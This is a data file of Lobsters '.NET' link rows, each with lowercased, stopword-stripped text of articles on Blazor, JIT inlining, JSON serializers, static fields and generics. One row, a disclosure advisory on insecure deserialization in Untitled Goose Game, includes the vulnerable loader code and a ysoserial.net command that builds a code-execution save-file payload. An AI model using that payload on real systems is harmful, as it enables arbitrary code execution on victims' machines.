105,Lobsters,dotnet,"C#, F#, .NET programming",Exploring lighter alternatives to Electron for hosting a Blazor desktop app,https://blog.stevensanderson.com/2019/11/01/exploring-lighter-alternatives-to-electron-for-hosting-a-blazor-desktop-app/,exploring lighter alternative electron hosting blazor desktop app,electron bundle copy chromium bundle copy nodejs light could get bundle chromium bundle node blazor electron sample experimental package hosting blazor electron blazor pure webview experiment called blazordesktop blazorelectron trying webview stats would built make viable ndc sydney crossplatform support webview edge chromium support handling scenario suitable webview found cef desktop apis publishing downloading update automatically feedback requested chromely neutralino webview,electron first opensourced gained immediate popularity way build desktop apps using web technology htmlcssjs core design idea bundling predictable environment bundle copy chromium know sure htmlcss rendered worry random old version ie etc bundle copy nodejs known version portable programming platform go beyond browser sandbox interact host o directly choice offered lot value five year ago late might choose differently choice also key electron reputation unusually resourcehungry default blank electron application download compressed run separate process consuming ram total completely possible number look fine satisfactory scenario case good post attempt bash electron wellrun project people clearly using successfully post simply want consider option might light could get bundle chromium instead used whatever webview already exists o desktop o going sufficiently modern usually chromiumbased browser ready go app likely matter whether chromium last week last year bundle node instead made use programming environment already o optionally brought different one frameworkdependent net core app easily standalone one ie bundling copy net core get linked compressed various electronlite alternative project already sprung course also pwas post since pwas native access underlying o blazor electron lot interest using blazor build crossplatform desktop apps surprising combining performance productivity c net familiarity htmlcss ui rendering powerful appealing published sample experimental package hosting blazor electron key innovation running webassembly rather us normal crossplatform net core runtime achieve full native net performance enable full access host o without browser sandbox limitation try today note asplabs project yet made commitment ship support technology blazor pure webview hard imagine blazor hybrid desktop app could slimmed dramatically could swap electron pure osnative web view reasoning virtually always good enough one available target machine plus really need node crossplatform programming environment since net core already play role u verify built experiment called blazordesktop similar blazorelectron fact code copypaste run native net core webassembly running much smaller rendering stack without bundled chromium nodejs fullyfunctional blazor application add native net corebased functionality run extremely lightweight desktop app see number unlike pwa limited browser sandbox interested trying please note purely quick proofofconcept currently window expanding crossplatform hard use something like webview add maclinux support something actively right send pr interested stats surprisingly minimal blazor webview application significantly smaller le memoryhungry one built whole chromium node stack one neat thing net core apps simple switch control whether publish output bundle copy net core runtime aka standalone whether assumes runtime already installed target o aka frameworkdependent captured first graph see make huge difference output size since blazor library compact corporate environment know certain software already installed safely distribute tiny frameworkdependent apps binary run supported o public distribution likely publish standalone app generating different binary window mac linux user note compressed blazor webview app consists bootstrap styling could drop using something else would built make viable said blazor desktop currently quick proofofconcept built entirely waking part return journey ndc sydney would long way go turn viable product would need crossplatform support eg using webview edge chromium support window using o chromiumbased browser instead edgebased webview used prototype would also enable access chromestyle browser dev tool automatically handling scenario suitable webview found rare case user o supply acceptable webview technology could prompt user download standalone chromium distribution likely via cef desktop apis big one would expensive achieve scratch electron use node generalpurpose programming environment also ship set crossplatform apis interacting desktop o task like copying clipboard changing taskbardock icon displaying native dropdown menu showing native promptsdialogs many thing net core supply huge proportion apis application need today address many desktopfocused one since today standard crossplatform net corebased ui technology realistic app need capability conceivably might worth bundling node get crossplatform implementation apis though still without bundling chromium publishing downloading update automatically feedback requested reason writing mainly learn developer community feel technology scenario building hybrid desktop apps nethtmlcss would happy use blazor electron feel necessary something baremetal many people thought building lighter alternative electron year various opensource project exist though clear really critical momentum mass adoption like chromely eliminate node bundle chromium others like neutralino eliminate chromium bundle nodebased programming model combined host o browser technology ultraminimal end webview simply abstraction idea webview show htmlcss whatever browser technology built host o provide crossplatform programming model
106,Lobsters,dotnet,"C#, F#, .NET programming",Untitled Goose Game - Insecure Deserialization,https://pulsesecurity.co.nz/advisories/untitled-goose-game-deserialization.html,untitled goose game insecure deserialization,date released author project website http goosegame affected software detail ysoserialnet mono support timeline,untitled goose game vulnerable code execution vulnerability due unsafe deserialization save game loader attacker capable controlling target save game leverage vulnerability execute malicious code save game loaded date released author denis andzakovic project website http goosegame affected software untitled goose game detail untitled goose game used dotnet binaryformatter read deserialize save game file serializationbinder specified attacker control save game file exploit deserialization process execute arbitrary code achieved writing malicious serialized object save game file later read untitled goose game save game file located c user user appdatalocallowhouse houseuntitled goose deserialization occurs standalonesavesystem class located untitleddatamanagedassemblycsharpdll following figure show vulnerable method public savegamedata loadslot int slot string savepath thisgetsavepath slot savegamedata result fileexists savepath debuglog loading savepath using filestream filestream fileopen savepath filemodeopen result savegamedata new binaryformatter deserialize filestream debuglog sucessfully loaded savegame data savepath else debuglog savefile nt exist nt load data result new savegamedata return result following screen capture show successful exploit ysoserialnet mono support exploitation vulnerability required modified version james typeconfusedelegate deserialization gadget detail patch found change merged ysoserialnet commit poc used generated ysoserialexe f binaryformatter typeconfusedelegatemono raw c calc c user user appdatalocallowhouse houseuntitled goose new typeconfusedelegatemono gadget used exploit deserialization vulnerability mono based code base including game built unity timeline advisory sent house house advisory acknowledged patch released epic game store house house advised patch released advisory released
108,Lobsters,dotnet,"C#, F#, .NET programming",Release IS NOT Debug: 64bit Optimizations and C# Method Inlining in Release Build Call Stacks,https://www.hanselman.com/blog/ReleaseISNOTDebug64bitOptimizationsAndCMethodInliningInReleaseBuildCallStacks.aspx,release debug optimization c method inlining release build call stack,introduction jeremy antipattern egon nt getting complete stack trace showing runtime reality programmer intent inlining disclaimer aside programmer reached moment moment decide whether slap attribute every method program attribute example know moment still time actually stop try understand problem example tail call optimization rather explicit method inlining david broman detailed blog post exactly tailcall optimizes nt original wiki portland pattern wiki tailcalloptimization method inlining eric gunnerson good article heuristic jit us part part clr jit overview antipattern option dry principle best solution something mark pearce told back net framework debugging control section ini file probably never used implementation detail hosting,reminder release build debug build seems obvious worth saying release build optimized speed debug build optimized well debugability however optimization managed code done jit compiler rather language compiler however sometimes zealous attempt make release build easier debug inadvertently totally vertently remove lot optimization make release build faster introduction talking jeremy come upon code inserting try catch throw block every method rationale wanted complete stack trace logging exception thrown noble goal technique adding guard called antipattern egon would say would bad antipattern pattern tell go problem bad solution first let start exploring nt getting complete stack trace tackle believe wantneed complete one simple program using system class normalprogram static void main string args try methoda catch systemexception e consolewriteline etostring static void methoda methodb static void methodb methodc static void methodc badmethod static void badmethod throw new applicationexception generic bad thing program main call call b call c call badmethod throw exception exception caught main far make sense right compile two version one debug mode one release run regular machine notice saying enable optimization release build making debug symbol release via debug pdbonly nt affect performance significant way fxroot cscexe exe normalreleaseexe debug pdbonly normalprogramcs fxroot cscexe exe normaldebugexe debug normalprogramcs run debug see systemapplicationexception generic bad thing normalprogrambadmethod normalprogramcs line normalprogrammethodc normalprogramcs line normalprogrammethodb normalprogramcs line normalprogrammethoda normalprogramcs line normalprogrammain string args normalprogramcs line look good make sense run release systemapplicationexception generic bad thing normalprogrambadmethod normalprogramcs line normalprogrammain string args normalprogramcs line call stack collapsed make harder debug really knew ended path two clear otherwise inlining would nt happened however confusing perception information missing important note information nt missing rather stack trace showing runtime reality write programmer intent nt exactly run especially thing optimized programmer best tell machine best fast correct let best see stack like first reaction information hidden fact code wrote ran every method got local stack frame optimized fewer method inlining disclaimer showing informational purpose without thinking good reason usually bad idea could confuse issue reason might want would kind funky thing made method require stack space nt add attribute willynilly nt program coincidence remember point post release debug different use differently tell runtime jitter inline add one line one using using system using systemruntimecompilerservices class normalprogram static void main string args try methoda catch systemexception e consolewriteline etostring methodimpl methodimploptionsnoinlining static void methoda methodb static void methodb methodc static void methodc badmethod static void badmethod throw new applicationexception generic bad thing run systemapplicationexception generic bad thing normalprogrambadmethod normalprogramcs line normalprogrammethoda normalprogramcs line normalprogrammain string args normalprogramcs line well stopped inlining method course b c still inlined see going get icky aside programmer reached moment moment decide whether slap attribute every method program attribute example know moment still time actually stop try understand problem ship let try using system using systemruntimecompilerservices class normalprogram methodimpl methodimploptionsnoinlining static void main string args try methoda catch systemexception e consolewriteline etostring methodimpl methodimploptionsnoinlining static void methoda methodb methodimpl methodimploptionsnoinlining static void methodb methodc methodimpl methodimploptionsnoinlining static void methodc badmethod static void badmethod throw new applicationexception generic bad thing compile run release systemapplicationexception generic bad thing normalprogrambadmethod normalprogramcs line normalprogrammethodc normalprogramcs line normalprogrammethodb normalprogramcs line normalprogrammethoda normalprogramcs line normalprogrammain string args normalprogramcs line back right well really got full stack neutered build jitter ca nt really job plus nt tried yet let run release build systemapplicationexception generic bad thing normalprogrammethodc normalprogramcs line normalprogrammain string args normalprogramcs line weird one conclusion draw would clr ignores method inlining attribute necessarily case another would aggressive inlining deal many optimization jitter many would nt give number special sauce le say one two inlining nt thing collapse call stack like also nt exactly true case remember whole new processor architecture around let say turn really like optimize example tail call optimization rather explicit method inlining sure read david broman detailed blog post exactly tailcall optimizes nt good explanation original wiki portland pattern wiki tailcall optimization tailcall merging tailcall elimination generalization tailrecursion last thing routine return call another routine rather jumpandaddstackframe immediately followed popstackframeandreturntocaller safe simply jump start second routine letting reuse first routine stack frame environment however tailcalloptimization drawback runtime environment confusing stack execution tailcalled routine make debugging difficult get baz never even call foo wiki explanation written c mind concept universal confusing stack execution tailcalled routine got writing blog post today controversy whether tail call optimization subset method inlining may never resolved discrete different eric gunnerson good article heuristic jit us inlining decision making process hardcore detail sure read david notario excellent series jit inlining part part perhaps start reading clr jit overview explains seven basic stage antipattern back customer beginning inserting try catch throw block every method let try nt home using system class uglyprogram static void main string args try methoda catch exception e consolewriteline e static void methoda try methodb catch throw static void methodb try methodc catch throw static void methodc try badmethod catch throw static void badmethod throw new applicationexception generic bad thing compile debug release produce output systemapplicationexception generic bad thing uglyprogrambadmethod uglyprogramcs line uglyprogrammethodc uglyprogramcs line uglyprogrammethodb uglyprogramcs line uglyprogrammethoda uglyprogramcs line uglyprogrammain string args uglyprogramcs line setting try introducing potential way method jitter ca nt optimize anything would collapse call stack like saw earlier nt good pattern nt deal underlying issue simple way customer want able debug release build easier option option could try trycatch every method good idea cluttering code paying cost time need debug productionrelease occasionally put methodimpl methodimploptionsnoinlining every method also good idea operative every method violating dry principle also deal one specific optimization many turn optimization compiler particular kind inlining appears jitter thing language compiler thing turn nt work instance ok customer want fuller call stack would propose fact nt want one old boss used say customer walk cell phone say thing need bigger antenna ask want bigger antenna better cell phone reception mark klein great pithy analogy everyone come problem solution customer want able debug release build surely nt want full call stack release mode mean turning optimization best solution one thing customer could would give best world something mark pearce told back net framework debugging control section ini file probably never used jit configuration two aspect request jitcompiler generate tracking information make possible debugger match chain msil machine code counterpart track local variable function argument stored request jitcompiler optimize resulting machine code file fooexe create fooini content net framework debugging control implementation detail ini file well net runtime nt started yet nt xmlparsey goodness lying around instead need use method getprivateprofilestring order retrieve solution assumes compiled debug pdbonly release mode order generate full stack needed dicslaimer nt something want put production use debugging something enable casebycase basis hosting
109,Lobsters,dotnet,"C#, F#, .NET programming",The Battle of C# to JSON Serializers in .NET Core 3,https://michaelscodingspot.com/the-battle-of-c-to-json-serializers-in-net-core-3/,battle c json serializers net core,systemtextjson json serialization big factor web application jsonnet newtonsoftjson need new serializer already got newtonsoftjson version conflict newtonsoftjson systemtextjson battling serializers newtonsoftjson jsonnet systemtextjson newtonsoftjson datacontractjsonserializer jil sigil servicestack protobufnet benchmark structure github benchmarkdotnet github benchmark serializing string github newtonsoftjson systemtextjson jil newtonsoftjson systemtextjson systemtextjson newtonsoftjson datacontractjsonserializer servicestack benchmark serializing stream jil jil datacontractjsonserializer benchmark deserializing string datacontractjsonserializer jil systemtextjson systemtextjson jsonnet newtonsoftjson systemtextjson benchmark request per second net server deserializing serializing microsoft performance test systemtextjson newtonsoftjson one m test systemtextjson newtonsoft systemtextjson newtonsoftjson good solution online nuget package c requestpersecond client result systemtextjson systemtextjson newtonsoft newtonsoftjson systemtextjson gc pressure microsoft test newtonsoft systemtextjson newtonsoft conclusion systemtextjson newtonsoftjson newtonsoftjson systemtextjson jil systemtextjson significantly mean change jil newtonsoftjson systemtextjson newtonsoftjson systemtextjson jil newtonsoftjson benchmark announcement benchmark systemtextjson newtonsoftjson requestspersecond test microbenchmarks solution jil benchmark jil newtonsoft protobuf servicestack github indepth benchmark performance optimization c best practice,net core recently released brought bunch innovation besides c support winforms wpf new release added brand new json de serializer new serializer go name systemtextjson name suggests class namespace big deal json serialization big factor web application today rest api relies javascript client sends json request post body server us json deserialization convert c object server return object response serializes object json javascript client understand major operation happen every request object performance significantly impact application performance see working net time know excellent jsonnet serializer also known newtonsoftjson need new serializer already got newtonsoftjson newtonsoftjson great several good reason replace microsoft wanted make use new type like span improve performance modifying huge library like newtonsoft without breaking functionality difficult network protocol including http use text type string net newtonsoft transcodes string work compromising performance new serializer us directly since newtonsoft party library part net framework bcl fcl class might project dependency different version aspnet core dependent newtonsoft result many version conflict blog post going performance benchmark see much new serializer improved performance except also going compare newtonsoftjson systemtextjson major serializers see fare battling serializers lineup newtonsoftjson also known jsonnet current industrystandard serializer integrated aspnet even though party nuget package time awardwinning library probably know systemtextjson brand new serializer microsoft supposedly faster better newtonsoftjson integrated default new aspnet core project part net framework nuget dependency needed version conflict either datacontractjsonserializer older microsoftdeveloped serializer integrated previous aspnet version newtonsoftjson replaced jil fast json serializer based sigil servicestack net serializer json jsv csv selfproclaimed fastest net text serializer meaning binary another self proclaimed fastest c json serializer work zero allocation readwrites directly binary performance note nonjson serializers faster notably protobufnet binary serializer faster compared serializers article though verified benchmark benchmark structure easy compare serializers need compare serialization deserialization need compare different type class small big list dictionary need compare serialization target string stream char array array pretty big matrix benchmark try organized concise possible test different functionality serialization string serialization stream deserialization string request per second aspnet core application test different type object see github small class primitivetype property bigger class property datetime couple enums list item small class dictionary item small class required benchmark pretty good indicator think benchmark used benchmarkdotnet following system oswindows intel core cpu kaby lake cpu logical physical core net core host net core coreclr corefx ryujit benchmark project github everything tested net core project benchmark serializing string first thing test serializing different object string benchmark code pretty straightforward see github public class serializetostring new private instance private datacontractjsonserializer datacontractjsonserializer globalsetup public void setup instance new datacontractjsonserializer new datacontractjsonserializer typeof benchmark public string runsystemtextjson return jsonserializerserialize instance benchmark public string runnewtonsoft return jsonconvertserializeobject instance benchmark public string rundatacontractjsonserializer using memorystream new memorystream datacontractjsonserializerwriteobject instance using var sr new streamreader return srreadtoend benchmark public string runjil return jiljsonserialize instance benchmark public string return instance benchmark public string runservicestack return sstjsonserializerserializetostring instance benchmark class generic test different object code like benchmarkrunnerrun serializetostring modelsbigclass running class type serializers result actual number result seen fastest far time faster newtonsoftjson systemtextjson pretty amazing difference jil also fast time faster newtonsoftjson systemtextjson new serializer systemtextjson better newtonsoftjson case except dictionary worst older datacontractjsonserializer worst others far servicestack right middle showing longer fastest text serializer least json benchmark serializing stream second set benchmark similar except serialize stream benchmark code result actual number result seen thanks adam sitnik ahson khan helping get systemtextjson work result pretty similar jil much time faster others jil performed better close second datacontractjsonserializer still slowest case newtonsoft actually performed well systemtextjson case better systemtextjson dictionary benchmark deserializing string next set benchmark deserialization string benchmark code found actual number result seen hard time datacontractjsonserializer one included see deserialization jil fastest close second two time faster systemtextjson systemtextjson faster jsonnet far look like popular newtonsoftjson newcomer systemtextjson significantly worse performance others pretty surprising due newtonsoftjson popularity hype around microsoft new topperformer systemtextjson let test even aspnet application benchmark request per second net server mentioned json serialization important constantly occurs rest api http request server use contenttype applicationjson need serialize deserialize json object server accepts payload post request server deserializing json server return object response serializing json modern clientserver communication heavily relies json serialization test real world scenario make sense create test server measure performance inspired microsoft performance test created mvc server application tested request per second microsoft benchmark test systemtextjson v newtonsoftjson article going except going compare proved one fastest serializer previous benchmark unfortunately able integrate aspnet core jil benchmark include absolutely sure possible effort building test proved challenging first created aspnet core mvc application like m test added controller performance test kind similar one m test route mvc public class jsonserializecontroller controller private static benchmarksserializersmodelsthousandsmallclasslist thousandsmallclasslist new benchmarksserializersmodelsthousandsmallclasslist httppost deserializethousandsmallclasslist consumes applicationjson public actionresult deserializethousandsmallclasslist frombody benchmarksserializersmodelsthousandsmallclasslist obj ok httpget serializethousandsmallclasslist produce applicationjson public object serializethousandsmallclasslist thousandsmallclasslist client call endpoint deserializethousandsmallclasslist server accept json text deserialize content test deserialization client call serializethousandsmallclasslist server return list smallclass item serialize content json next need cancel logging request affect result public static ihostbuilder createhostbuilder string args hostcreatedefaultbuilder args configurelogging logging loggingclearproviders loggingaddconsole configurewebhostdefaults webbuilder webbuilderusestartup startup need way switch systemtextjson newtonsoft first two switch easy nothing work systemtextjson switch newtonsoftjson add one line configureservices public void configureservices iservicecollection service servicesaddcontrollerswithviews uncomment newtonsoft commented us default systemtextjson addnewtonsoftjson need add custom inputformatter outputformatter medium formatters bit challenging eventually found good solution online tweak worked also nuget package formatters work aspnet core internal sealed class iinputformatter private readonly ijsonformatterresolver resolver public null public ijsonformatterresolver resolver resolver resolver jsonserializerdefaultresolver public bool canread inputformattercontext context contexthttpcontextrequestcontenttypestartswith applicationjson public async task inputformatterresult readasync inputformattercontext context var request contexthttpcontextrequest requestbodycanseek requestbodylength return await inputformatterresultnovalueasync var result await jsonserializernongenericdeserializeasync contextmodeltype requestbody resolver return await inputformatterresultsuccessasync result internal sealed class ioutputformatter private readonly ijsonformatterresolver resolver public null public ijsonformatterresolver resolver resolver resolver jsonserializerdefaultresolver public bool canwriteresult outputformattercanwritecontext context true public async task writeasync outputformatterwritecontext context contextcontenttypeisserverdefined contexthttpcontextresponsecontenttype applicationjson contextobjecttype typeof object await jsonserializernongenericserializeasync contexthttpcontextresponsebody contextobject resolver else await jsonserializernongenericserializeasync contextobjecttype contexthttpcontextresponsebody contextobject resolver aspnet use formatters public void configureservices iservicecollection service servicesaddcontrollerswithviews uncomment newtonsoft addnewtonsoftjson uncomment addmvcoptions option optionoutputformattersclear optionoutputformattersadd new standardresolverdefault optioninputformattersclear optioninputformattersadd new server client c requestpersecond client built client application c well though realworld scenario javascript client purpose really matter code public class requestpersecondclient private const string httpslocalhost http public async task run bool serialize bool await taskdelay timespanfromseconds var client new httpclient var json jsonconvertserializeobject new modelsthousandsmallclasslist warmup case int await dorequest json client serialize int count stopwatch sw new stopwatch swstart swelapsed timespanfromseconds count await dorequest json client serialize consolewriteline request one second count private async task dorequest string json httpclient client bool serialize serialize await doserializerequest client else await dodeserializerequest json client private async task dodeserializerequest string json httpclient client var uri new uri httpslocalhost mvcdeserializethousandsmallclasslist var content new stringcontent json applicationjson var result await clientpostasync uri content resultdispose private async task doserializerequest httpclient client var uri httpslocalhost mvcserializethousandsmallclasslist var result await clientgetasync uri resultdispose client send continuous request second counting result without ado result actual number result seen outperformed serializers landslide come big surprise previous benchmark serialization time faster systemtextjson whole time faster newtonsoft deserialization time faster systemtextjson time faster newtonsoft surprise poorly newtonsoftjson performed probably due issue http protocol work text newtonsoft convert text net string type overhead done either systemtextjson work directly important mention benchmark taken grain salt since might fully reflect realworld scenario ran everything local machine client server realworld scenario server client different machine client sends request one another single thread mean server accept one request time realworld scenario server accept request multiple thread different machine serializers may act differently serving multiple request time perhaps use memory better performance well multiple operation time perhaps create gc pressure likely allocation microsoft test achieved much request per second case sure probably point smaller payload still suspicious benchmark easy get wrong possible missed something server optimized configuration said result pretty incredible seems significantly improve response time changing json serializer changing newtonsoft systemtextjson improve request amount time changing newtonsoft improve huge factor entirely fair real server much accept argument return object probably stuff well like go database business logic serialization time might play lesser role still number pretty incredible conclusion let summary everything far newer systemtextjson serializer case faster newtonsoftjson benchmark kudos microsoft job well done party serializers proved faster newtonsoftjson systemtextjson specifically jil time faster systemtextjson requestsperseconds scenario showed integrated aspnet significantly increase request throughput thought mentioned full real world scenario suggest additional benchmark plan change serializers aspnet app mean change jil answer maybe remember newtonsoftjson stood test time became popular serializer reason support lot feature tested kind edge case ton documented solution workarounds systemtextjson newtonsoftjson extremely well supported microsoft continue invest resource effort systemtextjson going get excellent support whereas jil commits last year fact look like much maintenance done last month one option combine several serializers app change faster serializers aspnet integration achieve superior performance keep using newtonsoftjson business logic leverage feature set hope enjoyed one cheer benchmark several benchmark compare different serializers microsoft announcement systemtextjson released performance benchmark comparing systemtextjson newtonsoftjson addition serialization deserialization benchmark compare document class random access reader writer also release requestspersecond test inspired net core github repository includes bunch benchmark similar one article fact looked closely benchmark make sure mistake find microbenchmarks solution jil benchmark compare jil newtonsoft protobuf servicestack published set benchmark available github also compare binary serializers alois kraus great indepth benchmark popular net serializers including json serializers binary serializers xml serializers benchmark includes net core net framework benchmark share enjoy blog would love subscribe performance optimization c best practice exclusive article
110,Lobsters,dotnet,"C#, F#, .NET programming",Ordering of static fields in C# matters,https://rimdev.io/static-property-ordering-is-important/,ordering static field c matter,ordering static field c matter nres setup variation fieldsproperties,ordering static field c matter post day old never thought ordering relational static field property c mattered started getting nres property know set setup public static void main consolewriteline personempty null print true public class person public static readonly person empty empty private static readonly emptyperson empty new emptyperson public sealed class emptyperson person stepthrough code firsttime personempty called empty null get returned asis empty initialized late since empty static get initialized swap public class person private static readonly emptyperson empty new emptyperson public static readonly person empty empty empty instance emptyperson empty called everything good variation problem problem static fieldsproperties either expressionmember ordering matter public class person public static readonly person empty empty private static readonly emptyperson empty new emptyperson variation also work public class person public static readonly person empty empty private static readonly emptyperson empty new emptyperson public class person public static readonly person empty new emptyperson opted use private member several spot within final warning getteronly ie readonly also create new instance emptyperson every time empty called public class person nt public static person empty new emptyperson suggested reading
111,Lobsters,dotnet,"C#, F#, .NET programming",6 lesser-known features of C# / .NET that you should be using,https://chrisstclair.co.uk/6-lesser-known-features-of-c-net-that-you-should-be-using/,lesserknown feature c net using,introduction stopwatch benchmarknet roughly millisecond stopwatch task parallel library tpl see article tpl expression tree reference source caller information attribute caller information attribute slow path class pathcombine pathgettempfilename article pathgetinvalidpathchars pathgetinvalidfilenamechars stringbuilder stringbuilder conclusion,introduction post going setup feature net framework feel underutilised lot developer opinion whether underutilised may differ mine hope find post useful stopwatch going start something use stopwatch quite likely point reason want profile part code find performance bottleneck plethora benchmarking package use code benchmarknet one popular sometimes want benchmark something quickly without fuss imagine people would something like var start datetimenow threadsleep code want profile var end datetimenow var duration int end start totalmilliseconds consolewriteline operation took duration millisecond work tell took millisecond however recommended way benchmarking datetimenow may give required level precision datetimenow usually accurate roughly millisecond demonstrate see contrived example var sleep new list int foreach var sleep sleep var start datetimenow threadsleep sleep var end datetimenow var duration int end start totalmilliseconds consolewriteline duration output likely change every time likely get something like established precise care course carry using datetimenow method benchmarking much nicer alternative called stopwatch sits systemdiagnostics namespace much neater using datetimenow express intent much succinctly much accurate let change last bit code use stopwatch class var sleep new list int foreach var sleep sleep var sw stopwatchstartnew threadsleep sleep debugwriteline swelapsedmilliseconds output course variable much better really given ease using stopwatch class really reason use old fashioned way task parallel library tpl var item enumerablerange tolist var sw stopwatchstartnew foreach var item item threadsleep consolewriteline took swelapsedmilliseconds millisecond take expect roughly second let see parallel version using var item enumerablerange tolist var sw stopwatchstartnew parallelforeach item item threadsleep consolewriteline took swelapsedmilliseconds millisecond take average millisecond improvement result differ depending setup likely see similar improvement notice simple loop barely complicated regular foreach loop operate non thread safe object inside loop gon na bad time go replacing foreach see fit see article tpl tip expression tree expression tree extremely powerful part net framework yet also one poorly understood part nonexpert programmer took long time fully grasp concept still far expert matter essentially allows wrap lambda expression func action analyze actual lambda expression probably best illustrate example net framework plenty especially linq sql entity framework extension method linq object take func int bool main parameter see code stolen reference source contains net source code static ienumerable tsource whereiterator tsource ienumerable tsource source func tsource int bool predicate int index foreach tsource element source checked index predicate element index yield return element expect iterates ienumerable yield match predicate however clearly would work linq sqlentity framework need translate predicate sql signature iqueryable version bit static iqueryable tsource tsource iqueryable tsource source expression func tsource int bool predicate return sourceprovidercreatequery tsource expressioncall null getmethodinfo queryablewhere source predicate new expression sourceexpression expressionquote predicate look past daunting nature method notice function take func int bool wrapped expression essentially allows linq provider read func see exactly predicate passed translate sql essence expression allow examine code runtime let quickly look something bit simpler imagine code add setting dictionary used use real code var setting new list setting settingsadd new setting enablebugs settingsenablebugs settingsadd new setting enablefluxcapacitor settingsenablefluxcapacitor hope difficult see dangerrepetition name setting dictionary string typo could cause issue plus tedious create new method take expression func essentially take lambda expression return something get actual name variable passed private setting getsetting expression func expr var exprbody memberexpression null throw new argumentexception invalid expression memberexpression var func exprcompile convert expression back func var value func run func get setting value return new setting memembername value call var setting new list setting settingsadd getsetting settingsenablebugs settingsadd getsetting settingsenablefluxcapacitor much nicer note getsetting method need check expression passed memberexpression nothing stopping calling code passing something like method call constant value case member name obviously scratching surface expression capable hope write future post detailing caller information attribute caller information attribute introduced net framework useful case really show worth writing code log debugging information let imagine crude log function defined public static void log string text using var writer fileappendtext logtxt writerwriteline text call various point code log information text file however single string may useful debugging unless made effort put sufficient detail string likely want log entry occurred ie method examining stack trace public static void log string text using var writer fileappendtext logtxt writerwriteline text new stacktrace getframe getmethod name work print main call main method however slow inefficient essentially capturing stack trace would exception thrown net framework introduces aforementioned caller information attribute allows framework automatically tell method information calling specifically file path methodproperty name line number essentially use allowing method take optional string parameter mark attribute see use available attribute public static void log string text callermembername string membername callerfilepath string sourcefilepath callerlinenumber int sourcelinenumber consolewriteline text sourcefilepath membername line sourcelinenumber exactly expect output path source file method called also line number obviously information especially latter two useful debugging purpose impact speed information actually passed static value compile time downside pollutes method signature optional value never really want caller supply automatically think small price pay path class one may bit well known still see developer thing like getting file extension file name manually path class built tried tested method class life systemio namespace contains many helpful method reduces amount boilerplate code write lot familar method pathgetfilename pathgetextension expect mention slightly obscure one pathcombine method take path combine one generally people append filename directory path directorypath filename problem making assumption directory separator system application running application running unix us forward slash directory separator becoming concern net core allowing net application run many platform pathcombine use directory separator applicable operating system also deal redundant separator ie append directory end filename start pathcombine strip one see reason use pathcombine pathgettempfilename quite often need write file need access temporarily care name stored need write soon read could write code manage going tedious error prone enter insanely useful pathgettempfilename method path class take parameter creates empty file user defined temporary directory return full path use user temporary directory window automatically maintain need worry clogging system redundant file see article information method plus related gettemppath pathgetinvalidpathchars pathgetinvalidfilenamechars pathgetinvalidpathchars brother pathgetinvalidfilenamechars return array character invalid pathsfilenames current system seen much code manually strip common invalid character quote invalid character disaster waiting happen spirit cross platform compatibility incorrect assume invalid one system invalid another criticism method provide way checking path contains character usually involves writing boiler plate method public static bool hasinvalidpathchars string path path null throw new argumentnullexception nameof path return pathindexofany pathgetinvalidpathchars public static bool hasinvalidfilenamechars string filename filename null throw new argumentnullexception nameof filename return filenameindexofany pathgetinvalidfilenamechars stringbuilder string concatenation net common also inefficient done properly string immutable string concatenation result new string returned every concatenation small number concatenation difference minimal performance quickly deteriorate enter aptly named stringbuilder class allows concatenate minimal performance overhead fairly straightforward high level storing list every character append building string actually need demonstration use plus performance benefit see code benchmark using useful stopwatch class mentioned earlier var sw stopwatchstartnew string test int test test environmentnewline consolewriteline took swelapsedmilliseconds millisecond concatenate string using string concatenation sw stopwatchstartnew var sb new stringbuilder int sbappend test sbappendline consolewriteline took swelapsedmilliseconds millisecond concatenate string using stringbuilder result benchmark took millisecond concatenate string using string concatenationtook millisecond concatenate string using stringbuilder wow faster concatenation building large csv file manually bad practice anyway let worry figure may larger concatenating couple string probably fine use concatenate without using stringbuilder honest like get habit always using cost newing stringbuilder relatively speaking minuscule code sample using sbappend followed sbappendline actually call sbappendline passing text want append add new line end wanted include append appendline make bit clearer conclusion imagine seasoned professional familiar personally however took year find hope article help le experienced developer help avoid wasting time writing boilerplate potentially buggy code microsoft already kindly done u love hear anyone us underused feature netc please comment
112,Lobsters,dotnet,"C#, F#, .NET programming",What’s the maximum number of generic parameters for a class in .NET/C#?,https://www.tabsoverspaces.com/233802-whats-the-maximum-number-of-generic-parameters-for-a-class-in-net-csharp,maximum number generic parameter class netc,maximum number generic parameter class netc roslyn reflectionemit manual assembly creation using closing,maximum number generic parameter class netc oct min net net core c pretty stupid question right say enough still limit look least two way first obviously runtime willing load roslyn able compile good chance two limit roslyn let first check compiler people would create type obviously going type type manually going use code easily try limit using current net core assembly name systemcore assembly name systemruntime import namespace systemlinq import namespace systemcollectionsgeneric ienumerable long range long start long end var start end yield return ienumerable repeat value long count var count yield return value const int max var t stringjoin range max select x x var referencetypes stringjoin repeat string max var valuetypes stringjoin repeat int max namespace class realgenericclass t static class realgenericclass public static realgenericclass referencetypes createwithreferencetypes new realgenericclass referencetypes public static realgenericclass valuetypes createwithvaluetypes new realgenericclass valuetypes reflectionemit another way way le common yet somewhat middle using reflectionemit case much emit define type try load simple code process fails static void reflectionemit var assemblybuilder assemblybuilderdefinedynamicassembly new assemblyname dummy assemblybuilderaccessrun var modulebuilder assemblybuilderdefinedynamicmodule dummy var typebuilder modulebuilderdefinetype realgenericclass typeattributesclass typebuilderdefinegenericparameters t toarray var generic typebuildercreatetype var genericmakegenerictype repeat typeof int max toarray var instance activatorcreateinstance consolewriteline instance static ienumerable string t return range max select x x static ienumerable long range long start long end var start end yield return static ienumerable repeat value long count var count yield return value maybe create assembly using nonnetprovided library limitation probably aligned might get manual assembly creation using monocecil took trusty monocecil library started generating important part var typedefinition new monoceciltypedefinition realgenericclass monoceciltypeattributesclass basetype foreach var item t typedefinitiongenericparametersadd new monocecilgenericparameter item typedefinition assemblydefinitionmainmoduletypesadd typedefinition static ienumerable string t return range max select x x static ienumerable long range long start long end var start end yield return sadly although able create type generic parameter runtime refuse load known internal limitation many generic argument fair enough think surprisingly ildasm show type ilspy wrap show two generic argument type closing think generic parameter fair way beyond would person type use manually generated code well think still plenty need sure given generated code find way around biggest generic type ever created
113,Lobsters,dotnet,"C#, F#, .NET programming",How to Stress the C# Compiler,https://blog.hediet.de/post/how-to-stress-the-csharp-compiler,stress c compiler,,
